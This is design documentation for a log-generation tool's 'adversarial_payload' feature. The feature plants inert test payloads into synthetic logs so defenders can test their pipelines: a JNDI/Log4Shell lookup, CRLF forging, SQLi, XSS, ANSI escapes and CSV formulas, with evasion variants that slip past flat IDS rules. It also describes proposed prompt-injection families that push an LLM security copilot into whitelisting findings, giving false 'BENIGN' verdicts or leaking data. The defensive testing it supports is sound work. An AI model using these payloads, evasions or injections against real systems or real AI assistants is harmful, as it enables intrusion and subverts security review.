# Adversarial payload event type

The `adversarial_payload` event type injects a **known log-pipeline weakness
payload** into a semantic exposure *surface* of the generated logs, and records it
in the machine-readable ground-truth sidecar. It is the counterpart to
[`spillage`](spillage.md): where spillage leaks a fake *credential*, this carries a
deliberate *injection primitive* (ANSI escape, CRLF log-forging, CSV formula,
JNDI/Log4Shell lookup, reflected-XSS markup, SQL injection, structured-log/JSON
injection, oversized field) so defenders can verify their parsers, SIEMs, log
shippers, terminals, SQL-backed stores, and CSV/spreadsheet exporters handle
untrusted log content safely.

It reuses the spillage chassis — the same poison-marker requirement and hardened
host allowlist — but **inverts** one guardrail: spillage rejects control bytes
("log injection is the separate adversarial_payload work"); this event type *owns*
their controlled injection. A data-driven per-`(family, surface)` matrix decides
where bytes land raw (the realistic weakness, e.g. `syslog_message`) versus
escaped/percent-encoded (everywhere else).

## Scenario syntax

```yaml
storyline:
  - id: ap-crlf-syslog
    time: "+30m"
    actor: nina.kapoor
    system: APP-SRV-01            # Linux host (syslog_message is Linux-modeled)
    activity: "CRLF log forging in syslog (forges a second log line)"
    events:
      - type: adversarial_payload
        surface: syslog_message   # semantic surface, never an emitter name
        family: crlf_log_forging  # synthesize a canonical payload, OR:
        # value: "EFORGE_TEST ${jndi:ldap://canary.eforge.invalid/EFORGE_TEST}"  # a literal
```

Provide **exactly one** of `family` (synthesize a payload from a data-driven
family) or `value` (a literal that must pass the payload safety guardrails). For a
family, the payload is synthesized per event from the family's value template(s),
then rendered into a varied carrier line for the surface with surface-appropriate
encoding — routed through the canonical modeled generation path (syslog event,
process execution, or HTTP/S request), not a raw emitter shortcut.

A family declares its payload as **`value_templates`** — an ordered list of variant
templates: the canonical form **plus evasion/bypass variants** (Log4Shell
`${lower:j}ndi` / `${env:X:-j}` lookup obfuscation, SQLi `/**/`-comment whitespace,
zero-padded ANSI CSI params, `<img onerror>`/`<svg onload>`/mixed-case XSS, the four
spreadsheet formula-trigger prefixes `= + - @`). The engine picks one variant per
event by seed, so a dataset spans real detection-evasion *variety* — letting a
defender test detection **quality** (does the rule catch the obfuscated form?), not
just presence. A family may instead declare a single `value_template` or literal
`examples`; every variant is independently safety-checked at load and by
`validate-config`.

### Surfaces

| Surface | Modeled path | Output (source) | Encoding applied |
|---|---|---|---|
| `syslog_message` | syslog event | `syslog` (`…/syslog.log`) | **raw** where the family declares it (`raw_surfaces`), else control-character escaping |
| `process_command_line` | process execution (standalone, attributed to the actor) | `ecar` (EDR process telemetry, **required**) | control bytes escaped to a literal, then shell-quoting (`shlex.quote` / Windows quoting) |
| `http_user_agent` | HTTP/S request to a web server | `web_access` (the payload **is** the `User-Agent` header; the path is benign) | control-escape + `"`→`%22` (cannot break out of the quoted UA field) |
| `http_request_url` | HTTP/S request to a web server | `web_access` (payload in the request URL/query string → `path` field) | percent-encoding (`urllib.parse.quote`) |
| `http_referrer` | HTTP/S request to a web server | `web_access` (payload in the `Referer` header; the path is benign) | percent-encoding (`urllib.parse.quote`) |

`syslog_message` is Linux-modeled; `process_command_line` and the `http_*` surfaces
are cross-OS. The `http_*` surfaces model an outbound request **from the actor's
host directly to a web server** — a host with `roles: [web_server]` must exist (a
hard validation error otherwise), since the payload is recorded by that server's
`web_access` log. The request is sent direct (proxy-bypassed) so the access-log
`client_ip` is always the actor's host. `SURFACE_FORMATS` in
`generation/adversarial_payload.py` is the single extension point (renderer +
validation + eval all consume it).

**Transport scheme.** Like `spillage`, an `http_*` event may carry an explicit
`scheme: http | https` (valid only on the `http_*` surfaces). When omitted, the
request follows the destination web server's *supported* scheme (https preferred,
else http), derived from its `services` (`services: [http]` → port 80; `[https]`/
`[ssl]` → 443; a generic `web_server` with no scheme service → https). The effective
scheme is recorded in the ground-truth `scheme` attribute, and validation rejects a
`scheme:` for which no compatible web server exists (a phantom otherwise). The
payload always lands in the server's own `web_access` log, so presence scoring is
scheme-independent; a **plaintext-`http`** payload is *additionally* visible on the
wire (Zeek `http.log`) and is recognized there too — which is exactly the point of
forcing `scheme: http` when testing a network IDS's ability to catch the payload
(JNDI/XSS/CRLF) in cleartext. An `https` payload is encrypted on the wire, so only
the web server's application log sees it.

**Why raw only on `syslog_message`.** A raw control byte is realistic precisely
where a logger writes attacker-influenced text verbatim. The eCAR
`process_command_line` surface escapes control bytes to a literal *before* they
reach `command_line` — a raw byte there would corrupt the JSON record itself, which
is not the modeled weakness. On the `http_*` surfaces percent-encoding is what a
real client/proxy writes, and it still exercises a *decode-then-log* pipeline
(`%0d%0a`, `%24%7Bjndi…`).

### Families

The curated set is **data** in `config/activity/payload_families.yaml`:

| Family | Weakness class | What it tests | On-wire IDS |
|---|---|---|---|
| `ansi_escape` | terminal escape injection | a tail/terminal/console that renders raw ANSI (cursor moves, color, line-clear, title-set) from log text | — |
| `crlf_log_forging` | CRLF log forging | a parser/shipper that lets an embedded `\r\n` (or lone `\r`/`\n`) forge a second, attacker-controlled log line | `2012887` |
| `csv_formula` | CSV/formula injection | a spreadsheet/CSV export that evaluates `=`/`+`/`-`/`@`-prefixed cells (`=WEBSERVICE(...)`); models **`syslog_message` only** (the whole logged field must be the formula) | — |
| `log4shell` | JNDI/expression-language lookup | a logger/SIEM that interpolates `${jndi:ldap://…}` (the Log4Shell class), incl. obfuscated lookups | `2024317` |
| `xss_reflection` | stored/reflected XSS | a log-viewer web UI that renders `<script>`/`<img onerror>` from a stored field without escaping | — |
| `sql_injection` | SQL injection (CWE-89) | a SQL-backed SIEM/log store that string-concatenates a field into a query; a WAF/IDS SQLi rule | `2009714` |
| `structured_log_injection` | structured-log (JSON/logfmt) injection | a shipper that concatenates untrusted text into a JSON/key-value record, forging sibling fields | — |
| `oversized_field` | oversized/unbounded field (CWE-400) | a pipeline's field-length caps, truncation behavior, and regex/ingest cost on a multi-KB value | — |

A second family group targets a different downstream consumer — an **LLM SOC copilot**
that reads log content as instructions (OWASP LLM01:2025 indirect prompt injection):

| Family | Weakness class | What it tests | On-wire IDS |
|---|---|---|---|
| `prompt_injection_persona` *(proposed)* | persona/authority hijack | a copilot that lets an in-field claim of authority downgrade/whitelist a finding | — |
| `prompt_injection_context` *(proposed)* | context/output-structure manipulation | a copilot summarizer fooled by a forged log/markup boundary into a "BENIGN" verdict | — |
| `prompt_injection_exfil` *(proposed)* | data-exfiltration / tool-call abuse | a copilot induced to surface secrets, list other events, or call a tool | — |
| `prompt_injection_control` *(proposed)* | direct override + obfuscation | **labeled negative control** — a hardened copilot resists; emission ⇒ trivially broken | — |

These reuse the chassis but their proof is callback-free: every variant embeds the
**echo-canary** `{marker}-CANARY-{alnum:12}` (= `EFORGE_TEST-CANARY-<nonce>`), which is both
the per-line marker and the unique flag the injection tells the copilot to emit in its
*verdict* — a defender greps their copilot's output for it. See
[`scenarios/llm-injection-demo/`](../../scenarios/llm-injection-demo/README.md) for the
full threat framing and the tiered self-score recipe.

Each family declares its payload as `value_templates` (variant list), a single
`value_template`, or literal `examples` — with marker/canary/control-byte tokens —
plus the `surfaces` it models, its `raw_surfaces` subset, an
`expected_defender_signal`, optional per-surface `carriers`, and an optional on-wire
signature (`ids_sid` + its `ids_fires_on` content token; see below). All are user-customizable via the
overlay at `.eforge/config/activity/payload_families.yaml`, including adding new
families. Template tokens (`{marker}`, `{canary}`, `{esc}`, `{cr}`, `{lf}`, `{tab}`,
`{alnum:N}`, `{host}`) are expanded by the code engine; every template embeds the
poison marker so each produced line stays provably synthetic. `eforge
validate-config` synthesizes and safety-checks **every variant** of every family,
and runs a self-test (built from the config's own marker) that fails loudly if an
overlay weakened the marker, canary, or host allowlist.

### On-wire IDS detection

When a signature-mapped family (`ids_sid`) rides a **cleartext `http`** request, the
payload may be visible to a network IDS, so the canonical event carries an `IdsContext`
and — when an IDS sensor observes the path — the matching Snort/Suricata alert is
rendered to `snort_alert.log`. The mapping reuses the curated ET signature pool
(`config/activity/ids_signatures.yaml`), and each family declares the flat **content
token** (`ids_fires_on`) the rule keys on:

| Family | SID | Signature | `ids_fires_on` |
|---|---|---|---|
| `log4shell` | `2024317` | ET WEB_SERVER Possible CVE-2021-44228 Log4j RCE Attempt | `${jndi:` |
| `crlf_log_forging` | `2012887` | ET WEB_SERVER Possible CRLF Injection Attempt in HTTP Header | `\r\n` |
| `sql_injection` | `2009714` | ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT | `UNION SELECT` |

**The alert fires when the payload still contains the signature's content token** — so an
*evasion* variant that splits it (`${lower:j}ndi` / `${::-j}` / `${env:X:-j}ndi`,
`UNION/**/SELECT`, a comment-split forge) produces **no alert**, faithfully modeling a
flat-content rule's blind spot — the detection-quality signal a defender wants, not a
fabricated 100% catch rate.

> **Sensor model — read before scoring against `ids_alert`.** The modeled alert represents a
> sensor that **normalizes the URI/header buffer (percent-decoding) before content matching**
> — e.g. Suricata `http.uri` / `http.header` or Snort `http_inspect`. This matters because on
> the `http_request_url` / `http_referrer` surfaces the payload is percent-encoded on the wire
> (`UNION SELECT` → `UNION%20SELECT`, `${jndi:` → `%24%7Bjndi:`, `\r\n` → `%0d%0a`), so the
> literal `ids_fires_on` token is **not** byte-present in `web_access.log` / Zeek `http.log`; a
> normalizing rule recovers it, but a **raw-content rule without URI normalization may not
> fire**. Two consequences to keep in mind: (1) the SID/message are the upstream ET rule's
> own, so `2012887` reads "…in HTTP **Header**" even when a CRLF payload rode the URL query —
> always read the ground-truth **`surface`** field alongside `ids_alert` to see where the
> payload actually was; (2) `http_user_agent` keeps printable tokens literal on the wire, so
> its alerts also hold for a raw-content sensor. (Whether to additionally gate firing by
> surface — so a header-named rule doesn't fire on a URL payload — is a deliberate modeling
> choice left to the maintainer; today the dataset fires on the normalized token and records
> `surface` so either interpretation is recoverable.)

When an alert fires AND an IDS sensor on the path actually observes the connection, it is
recorded in ground truth as `ids_alert` (`sid`/`rev`/`message`) **and** rendered to
`snort_alert.log` — the two always agree (`GROUND_TRUTH.ids_alert` ⟺ a `snort_alert.log`
line), so the dataset is internally consistent for IDS scoring. The `ids_alert` field
follows the **same network-visibility rules as every network format**: an IDS sensor must
monitor the path (e.g. a perimeter IDS on the web server's segment), and east-west traffic
a TAP sensor cannot see (intra-segment), or a scenario with no IDS sensor, fires **no**
alert and records **no** `ids_alert`. An evaded variant records no `ids_alert`; an
**`https`** payload is encrypted on the wire, so none is attached; and a literal `value:`
(no family) never auto-fires. The surface a payload rode is recorded separately in the
ground-truth `surface` field, so always read `surface` alongside `ids_alert`.

## Safety guardrails

Adversarial payloads are *provably synthetic* injection content — every value is
safety-checked before it can land: a literal `value:` at `eforge validate` **and**
again at generation; a family-synthesized value at generation **and** at `eforge
validate-config`. Unlike spillage, **control bytes are permitted** (they are the
modeled weakness); the encoder decides per surface whether they land raw. The
invariants enforced are:

1. **Poison marker on EVERY physical line** — a payload that splits a record (CRLF
   forging) must carry a marker (`EFORGE_TEST`, `EVIDENCEFORGE`, `EXAMPLE`,
   `DO_NOT_USE`) on each resulting line, so a forged/split line is still
   self-evidently synthetic and can be pre-allowlisted. A forged second line that
   drops the marker is a hard error.
2. **Host allowlist** — any host embedded in the value (URL, `user@host`, or bare
   domain, including obfuscated-IPv4 and IDN/punycode forms) is the canary
   (`canary.eforge.invalid`, RFC 6761 non-resolving) or an RFC 2606 / 6761 reserved
   domain or RFC 5737 / 3849 / 1918 address. So a JNDI/XSS callback can never point
   at a real host.
3. **Known family** — a `family` must resolve in the merged config.

A value failing these (or a `family` used on a surface it does not declare, or a
surface whose output format/OS cannot emit it) is a hard validation **error** and
never reaches generation — so ground truth never labels a payload that was not
written. At generation time the same guarantee holds dynamically: if a surface
cannot emit (e.g. an `http_*` request no sensor observes), the event is recorded as
`skipped` (recorded with `emitted: false` and **no value fields**) rather than labeled.

Every family is inert at generation: the canary host does not resolve, and no
payload is interpreted by EvidenceForge — it is only ever written as text.

## Live callbacks (OOB testing) — opt-in

By default the canary is non-resolving, so payloads are inert. To actually validate
hardening end-to-end — confirming a vulnerable target *calls back* — register your
own out-of-band host (a Burp Collaborator / interactsh / DNS-sinkhole domain — a
concrete registrable domain or IP literal) at generation time:

```bash
eforge generate scenario.yaml --oob-host <your-collab-domain>
```

In live mode the family `{canary}` resolves to your host (e.g.
`${jndi:ldap://<your-collab>/…}`), and your host is added to the safety allowlist so
your **own fuzzer payloads** (supplied as a literal `value:`) pointing at your
Collaborator pass validation instead of being rejected as a real host. Safety stays
tight: **only the host(s) you explicitly register are accepted** (every other
non-reserved host is still rejected), each `--oob-host` must be a concrete registrable
domain or IP literal — bare TLDs like `com` and multi-label public suffixes (ICANN
ccTLD second-levels like `co.uk`/`co.in` and vendor namespaces like `github.io`/
`herokuapp.com`/`ngrok.io`) are refused, so a single entry can't allowlist a whole
namespace. The public-suffix set is a **curated common subset**, not the full Public
Suffix List (kept dependency-free per the project's design constraints) and is
overlay-extensible in `tls_realism.yaml`; a name *under* a suffix (`abc.github.io`,
`me.oast.fun`) is registrable and accepted. Register a specific host you control (ideally
a subdomain) rather than a broad shared-suffix domain — the marker is still
required on every line, generation prints a loud `LIVE CALLBACK MODE` banner, and each
affected record carries a `callback_host` attribute so you know exactly which OOB
interaction to watch for. Passing `--oob-host` is itself the explicit opt-in. `--oob-host`
is repeatable; subdomains of a registered host are accepted (so a per-payload
`<unique>.<your-collab>` works). Default runs record `callback_host: null` and remain
fully inert.

Even in live mode, EvidenceForge only ever writes the payload as **text** — it never
executes the payload or initiates a callback itself; any callback comes solely from a
genuinely vulnerable target that you pointed at your own host. Automated agents must
**not** enable `--oob-host` unless the user explicitly requests live/OOB callback
testing. `eforge validate --oob-host <host>` applies the same allowlisting so a
live-callback scenario can be validated before it is generated.

## Ground truth

Each event is recorded in two places: a **full machine-readable label** in the
canonical `GROUND_TRUTH.json` document (`kind: "adversarial_payload"`), and a
**human-readable summary** (control-byte-escaped preview + SHA-256) in the
`GROUND_TRUTH.md` derived from it. These payloads are inert, marked test artifacts —
not secrets — so the preview shows the payload content in full; control bytes are
escaped only so the Markdown renders safely. The document is the same schema-versioned canonical
ground-truth introduced for spillage; adversarial_payload is one more record `kind` in
its `events` list, with the per-kind facts nested under `attributes`:

```json
{"record_id":"ap-crlf-syslog#0","kind":"adversarial_payload",
 "storyline_id":"ap-crlf-syslog","time":"2024-03-18T14:30:00Z",
 "actor":"nina.kapoor","system":"APP-SRV-01",
 "activity":"CRLF log forging in syslog","ground_truth_section":"storyline",
 "emitted":true,
 "attributes":{"surface":"syslog_message","family":"crlf_log_forging",
   "value":"field=EFORGE_TEST\r\nforged-entry: status=cleared … EFORGE_TEST",
   "value_sha256":"…","rendered_value":"field=EFORGE_TEST\r\nforged-entry: … EFORGE_TEST",
   "rendered_sha256":"…","expected_sources":["syslog"],"encoding":"raw"}}
```

Field notes for scoring a parser/SIEM by hand:

- `rendered_value` is the surface-encoded payload **value**, and `rendered_sha256` is
  its SHA-256. The `encoding` field names the transform applied (`raw`, `percent`,
  `escaped`, `shell_quote`). It equals the **whole on-disk field** only for
  `syslog_message` (the full message) and `http_user_agent` (the UA header *is* the
  payload). For `http_request_url` and `http_referrer` it is the value **substring**
  wrapped in a benign carrier on disk (e.g. `/search?q=<value>`,
  `/api/v1/items?filter=<value>`, `https://host/login?next=<value>`), and for
  `process_command_line` it is the payload-arg **substring** of the full command line
  (whose eCAR JSON layer also escapes embedded quotes/backslashes — match the
  JSON-decoded `command_line`). So to reproduce `rendered_sha256` by hand, hash the
  carrier-stripped value fragment, not the whole request-target / `Referer` / command line.
- `weakness_class` and `expected_defender_signal` carry the family's CWE/CVE class
  and the **pass criterion** (what a hardened pipeline must do) so you can score a
  detection from ground truth alone.
- `ids_alert` (`{sid, rev, message}`) is present only when a **cleartext-`http`**,
  signature-mapped payload's rendered value still contains the signature's content token
  **and an IDS sensor actually observes the connection** — i.e. exactly when a
  `snort_alert.log` line is produced (`ids_alert` ⟺ on-disk alert). An **evasion variant
  records no `ids_alert`** (the flat rule misses it) and **east-west traffic an IDS TAP
  cannot see records none** (no sensor → no alert) — so its absence is the expected,
  correct result, not a gap. Grep `snort_alert.log` for `:<sid>:` to confirm your IDS
  caught the token-bearing ones (and that it does NOT over-fire on the evaded ones).
  Encrypted (`https`) payloads carry no `ids_alert`.
- **Pivot anchors** locate the exact evidence row: an `http_*` payload records
  `dst_ip` + `dst_port` (grep the target's `web_access.log` / `zeek_http` by
  `ip:port`); a `process_command_line` payload records `pid` (the eCAR `PROCESS`
  record). The connection UID is intentionally *not* recorded — the rendered Zeek row
  uses a sensor-derived UID, so a raw UID would mislead.
- On `http_user_agent` the payload (`${jndi:…}`, `<script>`, …) lands **literally** in
  the UA field — only its control bytes / `"` / `\` are percent-encoded — so a network
  IDS doing a raw content match on the UA buffer fires. On `http_request_url`/
  `http_referrer` the whole value is percent-encoded (`%24%7Bjndi…`, `%3Cscript%3E`),
  so a wire match needs a URL-decoding sensor (e.g. Suricata `http.uri`).
- A `crlf_log_forging` payload on `syslog_message` **spans two physical lines** (the
  injected line plus the forged `forged-entry:` line). `eforge eval` matches it
  against a per-format, newline-normalized search blob of the source text (parsed
  fields **plus** raw lines), so the two-line span is verified present even though
  no single parsed record contains it.
- `time` is the **actual emitted timestamp** of the log line.
- Locate a record's file from `expected_sources` + `system` + `actor`, for `http_*`
  surfaces from `<target_system>/web_access.log` (and `zeek_http` for plaintext-http),
  or `grep -rl` the output tree.

`eforge eval` reads this document to recognize adversarial_payload events: its
causality pillar confirms each labeled payload actually landed (so an
adversarial_payload dataset passes acceptance) — it does **not** re-run synthesis.
Detector precision/recall scoring is out of scope; when added it will fold into
`eforge eval`.
